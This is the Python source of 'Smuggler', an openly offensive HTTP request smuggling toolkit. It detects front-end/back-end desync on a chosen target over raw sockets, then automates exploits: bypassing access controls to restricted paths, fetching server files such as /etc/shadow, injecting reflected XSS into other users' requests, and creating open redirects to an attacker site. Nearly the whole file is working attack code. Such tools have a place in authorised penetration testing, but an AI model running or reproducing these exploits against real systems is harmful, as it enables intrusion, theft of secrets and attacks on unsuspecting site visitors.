#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
Smuggler (HTTP -Smuggling- Attack Toolkit) - 2020/2022 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with PandeMaths; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, socket, ssl

VERSION = "v:0.4"
RELEASE = "09122022"
SOURCE1 = "https://code.03c8.net/epsylon/smuggler"
SOURCE2 = "https://github.com/epsylon/smuggler"
CONTACT = "epsylon@riseup.net - (https://03c8.net)"

try:
    import payloads.payloads # import payloads
except:
    print ("\n[Info] Try to run the tool with Python3.x.y... (ex: python3 smuggler.py) -> [EXITING!]\n")
    sys.exit()

VULNERABLE_LIST = []

def set_target():
    target = input("\n  + Enter TARGET (ex: 'http(s)://www.evilcorp.com'): ").lower()
    if target.startswith("http://"):
        target = target.replace("http://","")
        port = 80
        SSL = False
    elif target.startswith("https://"):
        target = target.replace("https://","")
        port = 443
        SSL = True
    else:
        print("\n"+"-"*45)
        print("\n[Error] Target is invalid: '"+str(target)+"'\n")
        print("-"*45)
        sys.exit()
    method = input("\n  + Enter HTTP METHOD (default: 'POST'): ").upper()
    if method == "GET" or method == "POST":
        pass
    else:
        if method == "":
            method = "POST"
        else:
            print("\n"+"-"*45)
            print("\n[Error] Method is invalid: '"+str(method)+"'\n")
            print("-"*45)
            sys.exit()
    protocol = input("\n  + Enter PROTOCOL (default: 'HTTP/1.1'): ")
    if protocol == "":
        protocol = "HTTP/1.1"
    path = input("\n  + Enter PATH (default: '/'): ")
    if path == "":
        path = "/"
    cookie = input("\n  + Enter COOKIE (ex: 'session=iLxgKt7w3FIKor1csjB5HYbPrq9evRhb;'): ")
    return target, port, SSL, method, protocol, path, cookie

def detect(final): # detect menu
    target, port, SSL, method, protocol, path, cookie = set_target() # set target
    print("\n"+"="*50 + "\n")
    print("[Info] Starting -HTTP Smuggling- Timing detection ...")
    payloads_dsync = payloads.payloads.payloads # load payloads
    if target.endswith("/"):
        target = target.replace("/", "")
    addr = (target, port)
    print("")
    for payload in payloads_dsync:
        attack_type = payload.split("#")[0]
        payload_type = payload.split("#")[1]
        for i in range(0,2): # send payload twice
            print("="*50)
            print("Trying payload: ["+str(attack_type)+"] ["+str(i+1)+"/2]")
            print("="*50+"\n")
            if cookie is not "":
                payload = method+" "+path+" "+protocol+"\r\nHost: "+target+"\r\nCookie: "+cookie+"\r\n"+payload_type # main smuggling payload + cookie
            else:
                payload = method+" "+path+" "+protocol+"\r\nHost: "+target+"\r\n"+payload_type # main smuggling payload
            print("+ PAYLOAD:\n")
            print(payload)
            send_payload(attack_type, payload, addr, SSL) # send each payload
    if final == True:
        show_final_results(target, port, protocol, method, path, final)
    else:
        t, p, pr, m, pt = show_final_results(target, port, protocol, method, path, final)
        return t, p, pr, m, pt, SSL

def send_payload(attack_type, payload, addr, SSL):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if SSL == True: # ssl
        ss = ssl.wrap_socket(s)
    try:
        if SSL == True: # ssl
            ss.connect(addr)
        else:
            s.connect(addr)
    except Exception as e:
        print("-"*45)
        print("[Error] Generating socket... -> [PASSING!]")
        print(e)
        print("-"*45+"\n")
        if SSL == True: # ssl
            ss.close()
        else:
            s.close()
        return
    for i in range(0,10): # x10 tests
        if SSL == True: # ssl
            ss.send(payload.encode('utf-8'))
        else:
            s.send(payload.encode('utf-8'))
    datas=""
    while 1:
        if SSL == True: # ssl
            data = ss.recv(1024)
        else:
            data = s.recv(1024)
        if not data:        
            break
        try:
            datas += str(data.decode('utf-8'))
        except:
            pass
    print("\n+ REPLY:\n")
    print(str(datas))
    print("")
    resp_c=0
    resp=""
    wait=False
    for line in datas.split('\n'):
        if "502" in line or "501" in line or "404" in line or "405" in line or "403" in line or "400" in line:
            wait=False
            resp_c+=1
        else:
            wait=True
        if not wait:
            resp += line+'\n'
    print("-"*45)
    if resp_c > 0 and "Unrecognized method" in str(datas) or resp_c > 0 and "not supported for current URL" in str(datas):
        print ("PAYLOAD: ["+str(attack_type)+"] is WORKING! ;-)")
        if attack_type not in VULNERABLE_LIST:
            VULNERABLE_LIST.append(attack_type) # add attack type for results
    else:
        print ("PAYLOAD: ["+str(attack_type)+"] is NOT working...")
    print("-"*45+"\n")
    if SSL == True: # ssl
        ss.close()
    else:
        s.close()

def show_final_results(target, port, protocol, method, path, final):
    print("="*50)
    print("\n+ Detection RESULT: -HTTP Smuggling- Timing Attack\n")
    print("-"*45+"\n")
    print("  - TARGET: "+str(target)+":"+str(port))
    print("  - Method: "+str(method))
    print("  - Protocol: "+str(protocol))
    print("  - Path  : "+str(path))
    TETE = False
    TECL = False
    CLTE = False
    CLCL = False
    if VULNERABLE_LIST: 
        print("\n  - STATUS: [ VULNERABLE !!! ]\n")
        for v in VULNERABLE_LIST: # resume vulnerable payloads found
            if v.startswith("TE-TE") and TETE == False: # TE-TE
                print("    * [TE-TE]: [Front-end: Transfer-Encoding] <-> [Back-end: Transfer-Encoding]")
                TETE = True
            elif v.startswith("TE-CL") and TECL == False: # TE-CL
                print("    * [TE-CL]: [Front-end: Transfer-Encoding] <-> [Back-end: Content-Length]")
                TECL = True
            elif v.startswith("CL-TE") and CLTE == False: # CL-TE
                print("    * [CL-TE]: [Front-end: Content-Length] <-> [Back-end: Transfer-Encoding]")
                CLTE = True
            elif v.startswith("CL-CL") and CLCL == False: # CL-CL
                print("    * [CL-CL]: [Front-end: Content-Length] <-> [Back-end: Content-Length]")
                CLCL = True
    else:
        print("\n  - STATUS: [ NOT VULNERABLE ]")
        print("\n"+"="*50+"\n")
        sys.exit() # exit when not vulnerable!
    if final == False: # keep exploiting
        return target, port, protocol, method, path
    print("\n"+"="*50+"\n")

def manual(): # manual exploiting menu
    exploit_type = "MANUAL"
    exploit_path = input("\n+ SELECT PATH TO EXPLOIT CODE (default: 'payloads/dummy.txt')")
    if exploit_path == "":
        exploit_path = "payloads/dummy.txt"
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to EXPLOIT your own CODE (input: '"+exploit_path+"')...")
    target, port, protocol, method, path, SSL = detect(False) # set target
    addr = (target, port)
    f = open(exploit_path, "r")
    exploit = f.read()
    f.close()
    print("\n"+"-"*45)
    for v in VULNERABLE_LIST:
        print("="*50+"\n")
        print("+ PAYLOAD TYPE: ["+exploit_type+"]")
        print("+ EXPLOIT CODE:\n")
        print(str(exploit))
        send_exploit(addr, SSL, exploit, exploit_type, "MANUAL") # send exploit

def exploit(): # exploit menu
    exploit = input("\n+ SELECT EXPLOIT:\n\n  [0] SMG-VER-01: VERIFY that your 'chunked' requests are arriving correctly\n  [1] SMG-REV-01: REVEAL if the front-end performs some REWRITING of requests before they are forwarded to the back-end\n  [2] SMG-ACL-01: GRANT ACCESS to a RESTRICTED URL (ex: '/restricted/salaries/boss.php', '/admin/', '/private/messages' ...)\n  [3] SMG-GET-01: GET a FILE from the back-end server (ex: '/etc/shadow', '/server/config_db.php' ...)\n  [4] SMG-XSS-01: INJECT a (simple) reflected XSS in the back-end (exploit 'User-Agent', 'Referer' vulnerability) and append it to the next user's request\n  [5] SMG-UFO-01: TURN an 'on-site' redirect into an OPEN REDIRECT and append it to the next user's request\n\n")
    if exploit == "0": # verify acccess (back-end)
        exploit_verify()
    elif exploit == "1": # reveal (front-end)
        exploit_reveal()
    elif exploit == "2": # bypass (front-end)
        exploit_bypass()
    elif exploit == "3": # fetch files (back-end)
        exploit_steal()
    elif exploit == "4": # reflected XSS (back-end)
        exploit_XSS()
    elif exploit == "5": # open redirect (back-end)
        exploit_openredirect()
    else: # exit
        print ("[Info] Not any valid exploit selected... -> [EXITING!]\n")
        sys.exit()

def send_exploit(addr, SSL, exploit, exploit_type, exploit_mode):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if SSL == True: # ssl
        ss = ssl.wrap_socket(s)
    try:
        if SSL == True: # ssl
            ss.connect(addr)
        else:
            s.connect(addr)
    except Exception as e:
        print("-"*45)
        print("[Error] Generating socket... -> [PASSING!]")
        print(e)
        print("-"*45+"\n")
        if SSL == True: # ssl
            ss.close()
        else:
            s.close()
        return
    for i in range(0,2): # send exploit twice
        if SSL == True: # ssl
            ss.send(exploit.encode('utf-8'))
        else:
            s.send(exploit.encode('utf-8'))
    datas=""
    while 1:
        if SSL == True: # ssl
            data = ss.recv(1024)
        else:
            data = s.recv(1024)
        if not data:
            break
        try:
            datas += str(data.decode('utf-8'))
        except:
            pass
    print("\n"+"-"*45)
    print("\n+ REPLY:\n")
    print(str(datas))
    if exploit_mode == "VERIFY":
        print("\n"+"-"*45)
        print("\n[Info] This exploit ["+exploit_type+"] is working!!! ;-) \n")
    if SSL == True: # ssl
        ss.close()
    else:
        s.close()

def exploit_verify():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to VERIFY injections (generating back-end errors)...")
    target, port, protocol, method, path, SSL = detect(False) # set target
    addr = (target, port)
    print("\n"+"-"*45)
    exploits_dsync = payloads.payloads.exploits # load exploits
    smuggled_method = payloads.payloads.methods # load methods
    for v in VULNERABLE_LIST:
        for exp in exploits_dsync:
            if exp.split("#")[0] in v:
                for s in smuggled_method:
                    if s.split("#")[0] == "0": # verify reading
                        s = s.replace("$method", method)
                        s = s.replace("$path", path)
                        s = s.replace("$protocol", protocol)
                        s = s.replace("$target", target)
                        smuggled = s.split("#")[1].replace("\n","")
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$protocol", protocol)
                exploit = exploit.replace("$target", target)
                exploit_type = str(exp.split("#")[0])
                content_length2 = ""
                if exploit_type == "CL-TE-0":
                    content_length = len(smuggled)+5 #CL-TE-0
                elif exploit_type == "CL-TE-1":
                    content_length = len(smuggled)+4 #CL-TE-1
                elif exploit_type == "CL-CL-0":
                    content_length = len(smuggled)-1 #CL-CL-0
                elif exploit_type == "CL-CL-1":
                    content_length = len(smuggled)-1 #CL-CL-1
                    content_length2 = len(smuggled)-1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "CL-CL-2":
                    content_length = len(smuggled)-1 #CL-CL-2
                    content_length2 = len(smuggled)+1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "TE-CL-0":
                    content_length = len(smuggled)+3 #TE-CL-0
                elif exploit_type == "TE-CL-1":
                    content_length = len(smuggled)+2 #TE-CL-1
                elif exploit_type == "TE-TE-0":
                    content_length = len(smuggled)-1 #TE-TE-0
                    content_length2 = len(smuggled)-1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "TE-TE-1":
                    content_length = len(smuggled)-1 #TE-TE-1
                    content_length2 = len(smuggled)+1
                elif exploit_type == "TE-TE-2":
                    content_length = len(smuggled)-1 #TE-TE-2
                    content_length2 = len(smuggled)+1
                exploit = exploit.replace("$CL", str(content_length))
                exploit = exploit.replace("$SMUGGLED", smuggled)
                print("="*50+"\n")
                print("+ PAYLOAD TYPE: ["+exploit_type+"]")
                print("+ EXPLOIT CODE:\n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit, exploit_type, "VERIFY") # send exploit

def exploit_reveal():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to REVEAL front-end REWRITING...")
    target, port, protocol, method, path, SSL = detect(False) # set target
    addr = (target, port)
    print("\n"+"-"*45)
    print("\n"+"="*50)
    print("[Info] Exploiting front-end REWRITING...")
    print("="*50)
    parameter = input("\n  + Enter PARAMETER (ex: 'q', '_username', 'search' ...): ")
    exploits_dsync = payloads.payloads.exploits # load exploits
    smuggled_method = payloads.payloads.methods # load methods
    for v in VULNERABLE_LIST:
        for exp in exploits_dsync:
            if exp.split("#")[0] in v:
                for s in smuggled_method:
                    if s.split("#")[0] == "1": # reveal rewriting
                        s = s.replace("$method", method)
                        s = s.replace("$path", path)
                        s = s.replace("$protocol", protocol)
                        s = s.replace("$target", target)
                        s = s.replace("$parameter", parameter)
                        content_length = len(parameter)+2+50
                        s = s.replace("$CL", str(content_length))
                        smuggled = s.split("#")[1]
                        s = s.replace("$SMUGGLED", smuggled)
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$protocol", protocol)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$parameter", parameter)
                exploit = exploit.replace("$SMUGGLED", smuggled)
                exploit_type = str(exp.split("#")[0])
                content_length2 = ""
                if exploit_type == "CL-TE-0":
                    content_length = len(smuggled)+5 #CL-TE-0
                elif exploit_type == "CL-TE-1":
                    content_length = len(smuggled)+4 #CL-TE-1
                elif exploit_type == "CL-CL-0":
                    content_length = len(smuggled)-1 #CL-CL-0
                elif exploit_type == "CL-CL-1":
                    content_length = len(smuggled)-1 #CL-CL-1
                    content_length2 = len(smuggled)-1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "CL-CL-2":
                    content_length = len(smuggled)-1 #CL-CL-2
                    content_length2 = len(smuggled)+1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "TE-CL-0":
                    content_length = len(smuggled)+3 #TE-CL-0
                elif exploit_type == "TE-CL-1":
                    content_length = len(smuggled)+2 #TE-CL-1
                elif exploit_type == "TE-TE-0":
                    content_length = len(smuggled)-1 #TE-TE-0
                    content_length2 = len(smuggled)-1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "TE-TE-1":
                    content_length = len(smuggled)-1 #TE-TE-1
                    content_length2 = len(smuggled)+1
                elif exploit_type == "TE-TE-2":
                    content_length = len(smuggled)-1 #TE-TE-2
                    content_length2 = len(smuggled)+1
                exploit = exploit.replace("$CL", str(content_length))
                exploit = exploit.replace("$SMUGGLED", smuggled)
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD TYPE: ["+exploit_type+"]")
                print("+ EXPLOIT CODE:\n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit, exploit_type, "REVEAL") # send exploit

def exploit_bypass():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to REVEAL front-end REWRITING...")
    target, port, protocol, method, path, SSL = detect(False) # set target
    addr = (target, port)
    print("\n"+"-"*45)
    print("\n"+"="*50)
    restricted = input("\n  + Enter RESTRICTED ZONE (ex: '/restricted/salaries/boss.php', '/wp-admin/', '/private/messages'...): ")
    exploits_dsync = payloads.payloads.exploits # load exploits
    smuggled_method = payloads.payloads.methods # load methods
    for v in VULNERABLE_LIST:
        for exp in exploits_dsync:
            if exp.split("#")[0] in v:
                for s in smuggled_method:
                    if s.split("#")[0] == "2": # bypass ACLs
                        s = s.replace("$method", method)
                        s = s.replace("$path", path)
                        s = s.replace("$protocol", protocol)
                        s = s.replace("$target", target)
                        s = s.replace("$restricted", restricted)
                        content_length = 10 # $CL method
                        s = s.replace("$CL", str(content_length))
                        smuggled = s.split("#")[1]
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$protocol", protocol)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$restricted", restricted)
                exploit_type = str(exp.split("#")[0])
                content_length2 = ""
                if exploit_type == "CL-TE-0":
                    content_length = len(smuggled)+5 #CL-TE-0
                elif exploit_type == "CL-TE-1":
                    content_length = len(smuggled)+4 #CL-TE-1
                elif exploit_type == "CL-CL-0":
                    content_length = len(smuggled)-1 #CL-CL-0
                elif exploit_type == "CL-CL-1":
                    content_length = len(smuggled)-1 #CL-CL-1
                    content_length2 = len(smuggled)-1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "CL-CL-2":
                    content_length = len(smuggled)-1 #CL-CL-2
                    content_length2 = len(smuggled)+1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "TE-CL-0":
                    content_length = len(smuggled)+3 #TE-CL-0
                elif exploit_type == "TE-CL-1":
                    content_length = len(smuggled)+2 #TE-CL-1
                elif exploit_type == "TE-TE-0":
                    content_length = len(smuggled)-1 #TE-TE-0
                    content_length2 = len(smuggled)-1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "TE-TE-1":
                    content_length = len(smuggled)-1 #TE-TE-1
                    content_length2 = len(smuggled)+1
                elif exploit_type == "TE-TE-2":
                    content_length = len(smuggled)-1 #TE-TE-2
                    content_length2 = len(smuggled)+1
                exploit = exploit.replace("$CL", str(content_length))
                exploit = exploit.replace("$SMUGGLED", smuggled)
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD TYPE: ["+exploit_type+"]")
                print("+ EXPLOIT CODE:\n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit, exploit_type, "BYPASS") # send exploit

def exploit_steal():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to GET FILE from server...")
    target, port, protocol, method, path, SSL = detect(False) # set target
    addr = (target, port)
    print("\n"+"-"*45)
    files = input("\n  + Enter FILE (ex: '/etc/shadow', '/server/config_db.php' ...): ")
    exploits_dsync = payloads.payloads.exploits # load exploits
    smuggled_method = payloads.payloads.methods # load methods
    for v in VULNERABLE_LIST:
        for exp in exploits_dsync:
            if exp.split("#")[0] in v:
                for s in smuggled_method:
                    if s.split("#")[0] == "3": # fetch files
                        s = s.replace("$method", method)
                        s = s.replace("$path", path)
                        s = s.replace("$protocol", protocol)
                        s = s.replace("$target", target)
                        s = s.replace("$files", files)
                        content_length = len(files)+2 # p=len(files)
                        s = s.replace("$CL", str(content_length))
                        smuggled = s.split("#")[1]
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$protocol", protocol)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$files", files)
                exploit_type = str(exp.split("#")[0])
                content_length2 = ""
                if exploit_type == "CL-TE-0":
                    content_length = len(smuggled)+5 #CL-TE-0
                elif exploit_type == "CL-TE-1":
                    content_length = len(smuggled)+4 #CL-TE-1
                elif exploit_type == "CL-CL-0":
                    content_length = len(smuggled)-1 #CL-CL-0
                elif exploit_type == "CL-CL-1":
                    content_length = len(smuggled)-1 #CL-CL-1
                    content_length2 = len(smuggled)-1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "CL-CL-2":
                    content_length = len(smuggled)-1 #CL-CL-2
                    content_length2 = len(smuggled)+1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "TE-CL-0":
                    content_length = len(smuggled)+3 #TE-CL-0
                elif exploit_type == "TE-CL-1":
                    content_length = len(smuggled)+2 #TE-CL-1
                elif exploit_type == "TE-TE-0":
                    content_length = len(smuggled)-1 #TE-TE-0
                    content_length2 = len(smuggled)-1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "TE-TE-1":
                    content_length = len(smuggled)-1 #TE-TE-1
                    content_length2 = len(smuggled)+1
                elif exploit_type == "TE-TE-2":
                    content_length = len(smuggled)-1 #TE-TE-2
                    content_length2 = len(smuggled)+1
                exploit = exploit.replace("$CL", str(content_length))
                exploit = exploit.replace("$SMUGGLED", smuggled)
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD TYPE: ["+exploit_type+"]")
                print("+ EXPLOIT CODE:\n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit, exploit_type, "STEAL") # send exploit

def exploit_XSS():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to EXPLOIT a (simple) reflected XSS in the back-end (User-Agent, Referer)...")
    target, port, protocol, method, path, SSL = detect(False) # set target
    addr = (target, port)
    print("\n"+"-"*45)
    text = input("\n  + Enter TEXT (ex: 'XSS', '0wNed by ANONYMOUS', ...): ")
    exploits_dsync = payloads.payloads.exploits # load exploits
    smuggled_method = payloads.payloads.methods # load methods
    for v in VULNERABLE_LIST:
        for exp in exploits_dsync:
            if exp.split("#")[0] in v:
                for s in smuggled_method:
                    if s.split("#")[0] == "4": # reflected XSS
                        s = s.replace("$method", method)
                        s = s.replace("$path", path)
                        s = s.replace("$protocol", protocol)
                        s = s.replace("$target", target)
                        s = s.replace("$text", text)
                        content_length = len(text)-1
                        s = s.replace("$CL", str(content_length))
                        smuggled = s.split("#")[1]
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$protocol", protocol)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$text", text)
                exploit_type = str(exp.split("#")[0])
                content_length2 = ""
                if exploit_type == "CL-TE-0":
                    content_length = len(smuggled)+5 #CL-TE-0
                elif exploit_type == "CL-TE-1":
                    content_length = len(smuggled)+4 #CL-TE-1
                elif exploit_type == "CL-CL-0":
                    content_length = len(smuggled)-1 #CL-CL-0
                elif exploit_type == "CL-CL-1":
                    content_length = len(smuggled)-1 #CL-CL-1
                    content_length2 = len(smuggled)-1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "CL-CL-2":
                    content_length = len(smuggled)-1 #CL-CL-2
                    content_length2 = len(smuggled)+1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "TE-CL-0":
                    content_length = len(smuggled)+3 #TE-CL-0
                elif exploit_type == "TE-CL-1":
                    content_length = len(smuggled)+2 #TE-CL-1
                elif exploit_type == "TE-TE-0":
                    content_length = len(smuggled)-1 #TE-TE-0
                    content_length2 = len(smuggled)-1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "TE-TE-1":
                    content_length = len(smuggled)-1 #TE-TE-1
                    content_length2 = len(smuggled)+1
                elif exploit_type == "TE-TE-2":
                    content_length = len(smuggled)-1 #TE-TE-2
                    content_length2 = len(smuggled)+1
                exploit = exploit.replace("$CL", str(content_length))
                exploit = exploit.replace("$SMUGGLED", smuggled)
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD TYPE: ["+exploit_type+"]")
                print("+ EXPLOIT CODE:\n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit, exploit_type, "XSS") # send exploit

def exploit_openredirect():
    print("\n"+"="*50 + "\n")
    print("[Info] Trying to turn an 'on-site' redirect into an OPEN REDIRECT...")
    target, port, protocol, method, path, SSL = detect(False) # set target
    addr = (target, port)
    print("\n"+"-"*45)
    path2 = input("\n  + Enter 'on-site' URL (ex: '/', '/login', '/restricted', ...): ")
    redirect = input("\n  + Enter URL to redirect (ex: 'attacker-website.com' ...): ")
    exploits_dsync = payloads.payloads.exploits # load exploits
    smuggled_method = payloads.payloads.methods # load methods
    for v in VULNERABLE_LIST:
        for exp in exploits_dsync:
            if exp.split("#")[0] in v:
                for s in smuggled_method:
                    if s.split("#")[0] == "5": # open redirect
                        s = s.replace("$method", method)
                        s = s.replace("$path", path)
                        s = s.replace("$protocol", protocol)
                        s = s.replace("$target", target)
                        s = s.replace("$redirect", redirect)
                        s = s.replace("$PT", path2)
                        content_length = len(redirect)+1
                        s = s.replace("$CL", str(content_length))
                        smuggled = s.split("#")[1]
                exploit = exp.split("#")[1]
                exploit = exploit.replace("$method", method)
                exploit = exploit.replace("$path", path)
                exploit = exploit.replace("$protocol", protocol)
                exploit = exploit.replace("$target", target)
                exploit = exploit.replace("$redirect", redirect)
                exploit = exploit.replace("$PT", path2)
                exploit_type = str(exp.split("#")[0])
                content_length2 = ""
                if exploit_type == "CL-TE-0":
                    content_length = len(smuggled)+5 #CL-TE-0
                elif exploit_type == "CL-TE-1":
                    content_length = len(smuggled)+4 #CL-TE-1
                elif exploit_type == "CL-CL-0":
                    content_length = len(smuggled)-1 #CL-CL-0
                elif exploit_type == "CL-CL-1":
                    content_length = len(smuggled)-1 #CL-CL-1
                    content_length2 = len(smuggled)-1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "CL-CL-2":
                    content_length = len(smuggled)-1 #CL-CL-2
                    content_length2 = len(smuggled)+1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "TE-CL-0":
                    content_length = len(smuggled)+3 #TE-CL-0
                elif exploit_type == "TE-CL-1":
                    content_length = len(smuggled)+2 #TE-CL-1
                elif exploit_type == "TE-TE-0":
                    content_length = len(smuggled)-1 #TE-TE-0
                    content_length2 = len(smuggled)-1
                    exploit = exploit.replace("$LC", str(content_length2))
                elif exploit_type == "TE-TE-1":
                    content_length = len(smuggled)-1 #TE-TE-1
                    content_length2 = len(smuggled)+1
                elif exploit_type == "TE-TE-2":
                    content_length = len(smuggled)-1 #TE-TE-2
                    content_length2 = len(smuggled)+1
                exploit = exploit.replace("$CL", str(content_length))
                exploit = exploit.replace("$SMUGGLED", smuggled)
                print("\n"+"="*50+"\n")
                print("+ PAYLOAD TYPE: ["+exploit_type+"]")
                print("+ EXPLOIT CODE:\n")
                print(str(exploit))
                send_exploit(addr, SSL, exploit, exploit_type, "REDIRECT") # send exploit

def print_banner():
    print("\n"+"="*50)
    print(" ____  __  __ _   _  ____  ____ _     _____ ____  ")
    print("/ ___||  \/  | | | |/ ___|/ ___| |   | ____|  _ \ ")
    print("\___ \| |\/| | | | | |  _| |  _| |   |  _| | |_) |")
    print(" ___) | |  | | |_| | |_| | |_| | |___| |___|  _ < ")
    print("|____/|_|  |_|\___/ \____|\____|_____|_____|_| \_\ by psy")
    print('\n"HTTP -Smuggling- (DSYNC) Attacking Toolkit"')
    print("\n"+"-"*15+"\n")
    print(" * VERSION: ")
    print("   + "+VERSION+" - (rev:"+RELEASE+")")
    print("\n * SOURCES:")
    print("   + "+SOURCE1)
    print("   + "+SOURCE2)
    print("\n * CONTACT: ")
    print("   + "+CONTACT+"\n")
    print("-"*15+"\n")
    print("="*50)

# sub_init #
print_banner() # show banner
option = input("\n+ CHOOSE: (D)etect or (E)ploit: ").upper()
print("\n"+"="*50)
if option == "D": # detecting phase
    detect(True) # only detect
elif option == "E": # trying to exploit
    exp_type = input("\n+ CHOOSE: (A)utomatic or (M)anual: ").upper()
    print("\n"+"="*50)
    if exp_type == "M": # trying manual payload
        manual()
    else: # automatic exploits
        exploit()
else:
    print("\n"+"-"*45+"\n")
    print("[Smuggler by psy (https://03c8.net)]\n\n  Bye! ;-)\n")
    sys.exit()
